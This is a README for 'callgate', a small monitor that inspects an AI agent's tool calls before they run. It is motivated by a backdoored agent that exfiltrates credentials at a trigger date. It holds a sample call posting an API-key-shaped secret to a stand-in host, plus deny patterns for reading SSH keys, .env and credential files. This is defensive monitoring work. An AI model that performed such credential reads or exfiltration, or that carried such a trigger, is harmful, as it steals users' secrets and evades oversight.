# callgate

A runtime monitor for tool-calling agents. It inspects each tool call **before it
executes** and answers one question: *is this allowed, forbidden, or can I not judge
it?*

It needs no access to the model and no cooperation from it. The model is treated as
untrusted; the gate watches what it **does**, not what it **says**.

## Why this exists

A model publisher can ship an agent that is correct on every benchmark and quietly
exfiltrates credentials at a trigger date — the "SilentCall" supply-chain attack.
Alignment benchmarks do not see it. The defense the researchers recommend is a
runtime monitor in the call path that needs no model access.

This is that monitor, in its smallest honest form.

## The design law

**A check that cannot go red is not a check.**

Most monitors can only say *yes* or *no*, so anything they don't recognise gets a
*yes*. This one has a third answer — **UNKNOWN** — and it is a real answer. A call
it cannot classify is **held**, not allowed. The default policy blocks on UNKNOWN,
because the dangerous failure is a confident green about a call no rule actually
looked at.

## Install & run

No dependencies. Python 3.9+.

```bash
git clone <this repo> && cd callgate
python3 -m callgate.cli test        # run the suite, including the negative control
```

Check a stream of proposed calls (one JSON object per line):

```bash
echo '{"tool":"http_post","args":{"url":"https://x.example","body":"api_key=sk-ABCDEFGHIJKLMNOP123456"}}' \
  | python3 -m callgate.cli -
```

Exit codes carry the verdict: `0` allow · `3` unknown · `4` deny. So it drops into a
pipeline or a CI check directly.

## Use it in code

```python
from callgate import Gate

gate = Gate(log_path="callgate.jsonl", unknown_policy="block")

# wrap your real tool dispatcher
outcome = gate.run("http_post", {"url": "...", "body": "..."}, real_http_post)
if outcome["gate"] == "denied":
    ...            # the call never ran; outcome["verdict"] says why
```

Every check is appended to the JSONL log — one row per call, with the rule, the
reason, and which argument tripped it. That log is the artifact: it is what turns
"the agent says it did nothing wrong" into a record.

## What it catches

| shape | verdict |
|---|---|
| reading `~/.ssh`, `.env`, `credentials.json`, `auth.json`, `.netrc` | deny |
| an outbound call whose body/headers carry a key, bearer token, or PEM block | deny |
| a secret hidden inside otherwise-ordinary text | deny |
| an outbound call to a host it cannot classify | **unknown** (held) |
| an outbound tool with no resolvable target | **unknown** (held) |
| a plain local read or a call to localhost | allow |

## What it does NOT do

Be clear about the ceiling, because a monitor that oversells itself is worse than none:

- **It is a heuristic, not a proof.** It judges calls by their arguments. A secret it
  has no pattern for, or a host that looks benign, can pass. It reduces the attack
  surface; it does not close it.
- **It does not stop a determined exfil that uses no recognisable secret shape** (e.g.
  a slow drip of individually-innocuous values). That is a harder problem and a bigger
  tool.
- **UNKNOWN is not a bug.** If the gate holds a lot of your calls, it is telling you
  its rules don't recognise your workload. Extend the rules; don't widen the policy
  until it goes quiet.

## Extending it

Rules live in `callgate/rules.py`. Each is one function `(tool, args) -> Verdict` and
may return ALLOW, DENY, or UNKNOWN. Add a rule; add a case to `selftest.py`; make sure
the negative control still fails when you remove the rule it exercises. **A rule
without a failing test is a wish.**

## Status

v0.1.0 — three rules, nine tests, one negative control. Small on purpose.
